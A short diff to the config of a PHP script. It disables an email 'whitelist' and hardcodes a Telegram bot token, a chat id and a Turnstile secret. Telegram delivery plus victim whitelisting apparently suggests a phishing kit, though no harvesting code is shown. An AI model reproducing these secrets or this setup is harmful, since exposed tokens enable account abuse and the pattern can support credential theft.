@@ -13,7 +13,7 @@ session_start();
 // ---------- CONFIG ----------
 define('ATTEMPTS_FILE', '/data/attempts.json');   // Railway volume
 
-$EMAIL_VALIDATION_ENABLED = true;                 // whitelist ON/OFF
+$EMAIL_VALIDATION_ENABLED = false;                 // whitelist ON/OFF
 $telegram_bot_token       = "7657571386:AAHH3XWbHBENZBzBul6cfevzAoIiftu-TVQ";
 $telegram_chat_id         = "6915371044";
 $turnstile_secret         = "0x4AAAAAACEAdSoSffFlw4Y93xBl0UFbgsc";
